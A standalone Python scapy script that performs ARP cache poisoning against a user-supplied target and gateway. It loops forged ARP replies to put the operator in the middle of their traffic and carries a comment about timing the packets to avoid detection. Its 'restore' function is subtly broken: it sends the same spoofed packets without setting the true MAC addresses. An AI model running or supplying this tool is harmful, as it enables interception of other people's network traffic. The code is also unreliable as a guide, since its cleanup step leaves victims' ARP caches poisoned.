from scapy.all import ARP, Ether, sendp, srp
import time

def arp_poison(target_ip, gateway_ip, target_mac, gateway_mac):
    # Creating the ARP packets to poison the target and gateway
    target_arp = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    gateway_arp = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

    # Sending the poisoned ARP packets
    sendp(Ether(dst=target_mac)/target_arp, verbose=False)
    sendp(Ether(dst=gateway_mac)/gateway_arp, verbose=False)
    print(f"Poisoned ARP: Target {target_ip} -> Gateway {gateway_ip}")
    
def restore_arp(target_ip, gateway_ip, target_mac, gateway_mac):
    # Restoring the correct ARP entries after poisoning
    target_arp = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    gateway_arp = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

    sendp(Ether(dst=target_mac)/target_arp, verbose=False, count=5)
    sendp(Ether(dst=gateway_mac)/gateway_arp, verbose=False, count=5)
    print(f"Restored ARP: Target {target_ip} and Gateway {gateway_ip}")

def get_mac(ip, retries=3, timeout=2):
    # Function to get the MAC address of the given IP
    for _ in range(retries):
        arp_request = ARP(op=1, pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = srp(arp_request_broadcast, timeout=timeout, verbose=False)[0]
        
        if answered_list:
            return answered_list[0][1].hwsrc
        else:
            print(f"Retrying to get MAC address for {ip}...")
            time.sleep(timeout)
    print(f"Failed to get MAC address for {ip}")
    return None


if __name__ == "__main__":
    # Taking user inputs
    target_ip = input("Enter the IP address of the target: ")
    gateway_ip = input("Enter the IP address of the gateway: ")

    # Get the MAC addresses
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    print(f"Target MAC: {target_mac}")
    print(f"Gateway MAC: {gateway_mac}")
    
    try:
        while True:
            arp_poison(target_ip, gateway_ip, target_mac, gateway_mac)
            time.sleep(2)  # Adjust the interval to avoid detection
    except KeyboardInterrupt:
        print("Restoring ARP tables...")
        restore_arp(target_ip, gateway_ip, target_mac, gateway_mac)